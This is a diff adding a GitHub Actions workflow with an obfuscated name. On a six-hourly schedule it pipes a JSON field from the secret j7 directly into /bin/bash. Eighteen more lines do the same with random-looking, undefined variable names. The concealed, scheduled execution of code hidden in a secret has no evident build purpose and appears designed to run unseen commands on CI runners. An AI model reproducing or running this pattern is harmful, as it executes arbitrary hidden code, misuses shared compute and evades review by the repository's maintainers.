@@ -1,0 +1,36 @@
+name: liangfangzhaogang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: liangfangzhaogang
+        env:
+          j7: ${{ secrets.j7 }}
+        run: |
+          echo $j7 | jq -r .p4498 | /bin/bash
+          echo $nx60994 | jq -r .u318 | /bin/bash
+          echo $i58772 | jq -r .wq2 | /bin/bash
+          echo $s15360 | jq -r .brxh23 | /bin/bash
+          echo $a5 | jq -r .uwcxi37 | /bin/bash
+          echo $anwyv314 | jq -r .goln12 | /bin/bash
+          echo $cd52290 | jq -r .s31499 | /bin/bash
+          echo $ggmyt800 | jq -r .rywd34 | /bin/bash
+          echo $auwgg29921 | jq -r .mc0017 | /bin/bash
+          echo $jxngi9182 | jq -r .hir803 | /bin/bash
+          echo $h4 | jq -r .ekxfp92 | /bin/bash
+          echo $bcxtk778 | jq -r .wlcku69 | /bin/bash
+          echo $t612 | jq -r .idto813 | /bin/bash
+          echo $vjstx945 | jq -r .yrm705 | /bin/bash
+          echo $rhlp3705 | jq -r .cjhm66182 | /bin/bash
+          echo $ij7 | jq -r .isww212 | /bin/bash
+          echo $p83 | jq -r .gluj346 | /bin/bash
+          echo $q3441 | jq -r .memwl40514 | /bin/bash
+          echo $ayzt76940 | jq -r .lh53 | /bin/bash
+
